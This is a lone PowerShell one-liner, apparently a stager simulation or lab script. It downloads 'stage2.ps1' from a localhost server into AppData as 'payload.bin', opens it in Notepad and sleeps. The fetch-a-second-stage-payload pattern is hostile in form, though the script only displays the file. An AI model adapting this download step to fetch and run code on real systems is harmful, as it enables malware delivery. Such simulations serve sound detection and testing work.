
$TargetUrl = 'http://localhost:8000/stage2.ps1'; $LocalPath = "$env:APPDATA\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($TargetUrl, $LocalPath); Start-Process -FilePath "notepad.exe" -ArgumentList $LocalPath; Start-Sleep -Seconds 45
